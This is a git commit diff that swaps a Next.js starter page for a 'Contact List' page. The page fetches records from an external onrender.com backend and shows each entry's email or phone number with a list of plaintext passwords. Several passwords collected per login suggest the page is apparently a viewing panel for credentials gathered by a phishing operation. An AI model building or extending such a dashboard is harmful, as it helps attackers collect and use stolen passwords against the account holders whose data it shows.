fa0cfb4f011fd44a7d5f6915206054ac5da3c9fa
pdev6373 <adebayoluborode@gmail.com>
2024-12-31 07:34:24 +0100

    update

--- app/page.tsx
+++ app/page.tsx
@@ -1,101 +1,79 @@
-import Image from "next/image";
+'use client';
+import axios from 'axios';
+import Image from 'next/image';
+import { useEffect, useState } from 'react';
 
 export default function Home() {
-  return (
-    <div className="grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 gap-16 sm:p-20 font-[family-name:var(--font-geist-sans)]">
-      <main className="flex flex-col gap-8 row-start-2 items-center sm:items-start">
-        <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={180}
-          height={38}
-          priority
-        />
-        <ol className="list-inside list-decimal text-sm text-center sm:text-left font-[family-name:var(--font-geist-mono)]">
-          <li className="mb-2">
-            Get started by editing{" "}
-            <code className="bg-black/[.05] dark:bg-white/[.06] px-1 py-0.5 rounded font-semibold">
-              app/page.tsx
-            </code>
-            .
-          </li>
-          <li>Save and see your changes instantly.</li>
-        </ol>
+  const [gettingData, setGettingData] = useState(true);
+  const [data, setData] =
+    useState<{ _id: string; email: string; password: string[] }[]>();
 
-        <div className="flex gap-4 items-center flex-col sm:flex-row">
-          <a
-            className="rounded-full border border-solid border-transparent transition-colors flex items-center justify-center bg-foreground text-background gap-2 hover:bg-[#383838] dark:hover:bg-[#ccc] text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={20}
-              height={20}
-            />
-            Deploy now
-          </a>
-          <a
-            className="rounded-full border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center hover:bg-[#f2f2f2] dark:hover:bg-[#1a1a1a] hover:border-transparent text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 sm:min-w-44"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Read our docs
-          </a>
+  useEffect(() => {
+    (async () => {
+      try {
+        const response = await axios.get('https://to-del-be.onrender.com');
+        console.log('res', response.data);
+        setData(response.data.data);
+      } finally {
+        setGettingData(false);
+      }
+    })();
+  }, []);
+
+  if (gettingData)
+    return (
+      <div className="w-full h-screen flex justify-center items-center bg-gray-900">
+        <Image
+          src={'/spinner.svg'}
+          alt="spinner"
+          width={40}
+          height={40}
+          className="animate-spin"
+        />
+      </div>
+    );
+
+  if (!data?.length)
+    return (
+      <div className="w-full h-screen flex justify-center items-center bg-gray-900">
+        <div className="text-center">
+          <h2 className="text-2xl font-bold text-gray-700">
+            No Data Available
+          </h2>
+          <p className="text-gray-500 mt-2">
+            Try refreshing or come back later.
+          </p>
         </div>
-      </main>
-      <footer className="row-start-3 flex gap-6 flex-wrap items-center justify-center">
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/file.svg"
-            alt="File icon"
-            width={16}
-            height={16}
-          />
-          Learn
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/window.svg"
-            alt="Window icon"
-            width={16}
-            height={16}
-          />
-          Examples
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/globe.svg"
-            alt="Globe icon"
-            width={16}
-            height={16}
-          />
-          Go to nextjs.org →
-        </a>
-      </footer>
+      </div>
+    );
+
+  return (
+    <div className="p-8 bg-gray-900 text-white min-h-screen flex flex-col justify-between">
+      <div>
+        <h1 className="text-3xl font-bold text-center text-teal-400 mb-9">
+          Contact List
+        </h1>
+
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-2 xl:grid-cols-3 gap-3">
+          {data?.map((data, index) => (
+            <div
+              key={index}
+              className="bg-gray-800 p-5 rounded-lg shadow-lg hover:shadow-xl"
+            >
+              <div className="flex justify-between items-center">
+                <p className="text-sm text-gray-400">Email/Phone Number:</p>
+                <p className="text-sm text-gray-200">{data.email}</p>
+              </div>
+              <div className="flex justify-between items-center mt-2">
+                <p className="text-sm text-gray-400">Passwords:</p>
+                <p className="text-sm text-gray-200">
+                  {data.password.join(', ')}
+                </p>
+              </div>
+            </div>
+          ))}
+        </div>
+      </div>
     </div>
   );
 }
